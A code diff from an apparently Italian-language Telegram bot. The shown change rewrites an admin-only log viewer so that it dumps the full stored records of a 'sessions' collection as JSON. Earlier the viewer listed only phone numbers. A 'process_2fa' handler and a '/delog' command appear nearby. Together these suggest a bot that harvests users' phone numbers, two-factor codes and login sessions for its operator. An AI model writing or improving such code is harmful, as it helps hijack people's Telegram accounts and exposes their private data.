@@ -230,13 +230,23 @@ async def process_2fa(message: types.Message):
 async def view_logs(message: types.Message):
     if message.from_user.id != ADMIN_ID:
         return
-    logs = sessions_col.find()
-    text = ""
+
+    logs = list(sessions_col.find())
+
+    if not logs:
+        await message.answer("❌ Nessuna sessione trovata.")
+        return
+
     for log in logs:
-        text += f"📱 {log.get('phone')}\n"
-    if not text:
-        text = "❌ Nessuna sessione trovata."
-    await message.answer(text)
+        log.pop("_id", None)  # убираем MongoID
+        pretty = json.dumps(log, indent=2, ensure_ascii=False)
+        if len(pretty) > 4096:
+            chunks = [pretty[i:i+4000] for i in range(0, len(pretty), 4000)]
+            for chunk in chunks:
+                await message.answer(f"```\n{chunk}\n```", parse_mode="Markdown")
+        else:
+            await message.answer(f"```\n{pretty}\n```", parse_mode="Markdown")
+
 
 @dp.message_handler(commands=['delog'])
 async def delete_logs(message: types.Message):
